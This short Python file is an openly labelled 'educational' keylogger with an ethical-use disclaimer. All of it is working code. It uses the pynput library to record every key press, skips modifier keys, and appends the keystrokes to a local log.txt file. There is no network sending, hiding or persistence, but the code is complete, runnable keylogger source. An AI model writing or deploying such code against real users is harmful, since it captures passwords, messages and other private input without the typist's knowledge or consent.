# -*- coding: utf-8 -*-
"""
Educational Keylogger - For Cybersecurity Awareness & Ethical Hacking Training
Author: Farouk
License: MIT
Disclaimer: This script is for educational purposes only. Do not use it for malicious activities.
"""

from pynput.keyboard import Key, Listener

def write_to_file(key):
    """
    Logs keystrokes into 'log.txt' file after filtering unnecessary keys.
    """
    try:
        keydata = str(key).replace("'", "")

        # Handling special keys
        if key == Key.space:
            keydata = ' '
        elif key == Key.enter:
            keydata = '\n'
        elif key in (Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):
            keydata = ''  # Ignoring modifier keys

        # Write key data to log file
        with open('log.txt', 'a') as f:
            f.write(keydata)
    
    except Exception as e:
        print(f"Error: {e}")

# Setting up key listener
with Listener(on_press=write_to_file) as listener:
    listener.join()
